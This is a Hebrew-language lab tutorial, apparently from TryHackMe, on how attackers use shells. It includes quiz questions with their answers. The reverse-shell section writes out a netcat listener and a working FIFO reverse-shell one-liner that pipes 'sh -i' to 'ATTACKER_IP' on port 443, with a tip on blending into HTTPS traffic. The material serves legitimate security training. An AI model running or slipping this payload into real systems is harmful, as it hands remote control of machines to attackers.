<img width="681" height="293" alt="image" src="https://github.com/user-attachments/assets/94ef8c7c-45fc-46c9-a3be-9cfc6688fff7" />

.



בעולם אבטחת המידע, Shells הם כלי מרכזי בשרשרת התקיפה. הם מאפשרים לתוקף להריץ פקודות על מערכת יעד מרחוק. הבנת המנגנונים הללו חיונית לא רק עבור בודקי חדירות (Penetration Testers), אלא גם עבור אנשי הגנה (Blue Team) כדי לזהות ולבלום פעילות עוינת ברשת הארגונית.

🎯 יעדי הלמידה
בסיום מדריך זה, תדעו:

להבין את תפקיד ה-Shell באבטחה התקפית.

להגדיר ולהשתמש ב-Reverse Shell וב-Bind Shell.

להטמיע ולהשתמש ב-Web Shells.

🛠 דרישות קדם
כדי להפיק את המרב מהמדריך, מומלץ להחזיק בידע בסיסי בנושאים הבאים:

הבנה בסיסית ברשתות (Networking).

היכרות עם אבטחת אפליקציות אינטרנט.

מיומנות בעבודה עם שורת הפקודה (CLI).

היכרות בסיסית עם שפות סקריפט (Bash, Python, או PHP).

⚠️ דגשים חשובים (Caveats)
ללא Frameworks: במדריך זה לא נשתמש ב-Metasploit או בכלים אוטומטיים אחרים. המטרה היא להבין איך Shells עובדים "מתחת למכונה" ללא סיוע של כלים גנרטיביים.

מערכת הפעלה: כל הדוגמאות במדריך מבוססות על מערכות Linux.

🚀 תחילת העבודה
הפעלת המעבדה
כדי להתחיל בתרגול, יש להפעיל את המכונה הווירטואלית (VM):

לחצו על כפתור Start Machine. (טעינת המערכת אורכת כ-2 דקות).

המכונה תופיע בצד ימין של המסך (Split View).

ניתן להשתמש ב-AttackBox של המערכת או להתחבר דרך ה-VPN האישי שלכם כדי לדמות את עמדת התוקף.

<img width="941" height="388" alt="image" src="https://github.com/user-attachments/assets/b2955b45-f388-4fce-b416-0390b3cb3771" />


שאלה,תשובה
מהו ממשק שורת הפקודה המאפשר למשתמשים לתקשר עם מערכת ההפעלה?,Shell
איזה תהליך כולל שימוש במערכת פרוצה כנקודת זינוק לתקיפת מכונות אחרות ברשת?,Pivoting
מהי פעילות נפוצה שתוקפים מבצעים לאחר השגת Shell כדי להשיג הרשאות ניהול?,Privilege Escalation


🔄 Reverse Shell (Connect Back Shell)
ב-Reverse Shell, היעד (המערכת הפרוצה) הוא זה שמתחבר אל התוקף.
מדוע זה יעיל? חומות אש רבות חוסמות תעבורה נכנסת לא מוכרת, אך מאפשרות תעבורה יוצאת (כדי לאפשר למשתמשים לגלוש באינטרנט, למשל).

1. הגדרת המאזין (The Listener)
לפני שנריץ את הפקודה במערכת היעד, התוקף חייב "להקשיב" לחיבור נכנס. נשתמש בכלי Netcat (nc):

Bash
nc -lvnp 443
הסבר הדגלים:

-l (Listen): אומר ל-Netcat להמתין לחיבור.

-v (Verbose): מציג פירוט על החיבור שמתקבל.

-n (Numeric): אל תבצע פענוח DNS (חוסך זמן ומונע רעש).

-p 443 (Port): הפורט שעליו נאזין.

טיפ של מקצוענים: תוקפים משתמשים בפורטים כמו 443 (HTTPS) או 80 (HTTP) כדי שהתעבורה תיראה לגיטימית ותתמזג עם תנועת הגלישה הרגילה ברשת.

2. הפעלת המטען (The Payload)
לאחר שהמאזין מוכן, נריץ פקודה במערכת היעד שתשלח אלינו את ה-Shell. דוגמה נפוצה ב-Linux היא שימוש ב-Named Pipe (FIFO):

Bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
מה קורה כאן?

mkfifo /tmp/f: יוצר צינור (Pipe) שמאפשר תקשורת דו-כיוונית.

sh -i: מריץ Shell אינטראקטיבי.

nc ATTACKER_IP 443: שולח את הפלט של ה-Shell לכתובת ה-IP של התוקף.

2>&1: דואג שגם הודעות שגיאה יישלחו לתוקף ולא יישארו על מסך היעד.

3. קבלת הגישה
ברגע שהפקודה תרוץ ביעד, הטרמינל של התוקף ישתנה:

Plaintext
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37]
target@tryhackme:~$ 
מזל טוב! עכשיו יש לכם שליטה מלאה על המכונה מרחוק.



<img width="986" height="621" alt="image" src="https://github.com/user-attachments/assets/3833d0a2-b92e-4de7-9cf7-06097cc23c36" />



שאלה,תשובה
איזה סוג Shell מאפשר לתוקף להריץ פקודות מרחוק לאחר שהיעד מתחבר אליו חזרה?,Reverse Shell
איזה כלי נפוץ משמש להגדרת מאזין (Listener) עבור Reverse Shell?,Netcat






